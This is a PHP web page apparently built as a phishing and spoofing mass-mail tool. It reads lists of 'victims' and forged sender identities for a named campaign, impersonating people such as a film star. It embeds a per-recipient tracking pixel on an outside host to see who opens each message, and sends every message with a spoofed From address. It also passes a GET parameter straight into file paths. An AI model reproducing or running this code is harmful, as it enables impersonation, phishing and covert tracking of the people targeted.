<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>YouGotMail</title>
</head>

<body style="margin-top:0px;">
<center>
<img src="pagelogo.jpg"/><br />
<img src="finish.png" /><br /><br /><br /><br />
<font face=verdana size=2>

<?php

ini_set('display_errors',1);
ini_set('display_startup_errors',1);
error_reporting(-1);


require 'class.phpmailer.php';
$c=$_GET['campaign'];

$f=$c.'/Subject.txt';
$file_handle = fopen($f, "r");
while (!feof($file_handle)) {
   $line = fgets($file_handle);
   $m=$line;
}
fclose($file_handle);

$subject=$m;

$victims=array();

$f=$c.'/Victims.txt';
$meat=file_get_contents($f);
$victims=explode(",",$meat,-1);

$f=$c.'/Senders.txt';
$meat1=file_get_contents($f);
$senders=explode("*",$meat1,-1);



//$victims=array("someone@outlook.com","someoneelse@gmail.com");
//$senders=array("Shahrukh Khan,shahrukh@filmfare.com","Shahrukh Khan,shahrukh@filmfare.com");



$y=0;
for ($x=0;$x<count($victims);$x++)
{

$dir = $c."/body/";
if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
           
	if(filetype($dir . $file)=='file')		
	$body=$file;
		
        }
	$body=$c."/body/".$body;
        closedir($dh);
    }
}

$file = fopen($body,"r");
$foot=fread($file,filesize($body));
fclose($file);


$imemail=explode("@",$victims[$x]);
$im=$imemail[0].".jpg";


$rec="<table height=200 width=500><tr><td><img src='http://daretosay.webege.com/".$im."' height=20 width=20></td></tr></table><br>".$foot;

$f=fopen($c.'/tempBody.html','w');
fwrite($f,$rec);
fclose($f);

$body=$c.'/tempBody.html';

$mail = new PHPMailer();

$mail->Subject = $subject;
$mail->MsgHTML(file_get_contents($body), dirname(__FILE__));
$mail->AltBody = 'This is a plain-text message body';

$a=explode(",",$senders[$y]);
$mail->SetFrom($a[1], $a[0]);

echo "from: ".$a[1]."<br>";
$mail->AddAddress($victims[$x]);
echo "to: ".$victims[$x]."<br>";

$y++;

if ($y>=count($senders))
		$y=0;

if(!$mail->Send())
  echo "Mailer Error: " . $mail->ErrorInfo;
else
  echo "-------------------------<br>";

$mail->ClearAddresses();

}

?>



</font>
<br /><br />

</center>
</body>
</html>
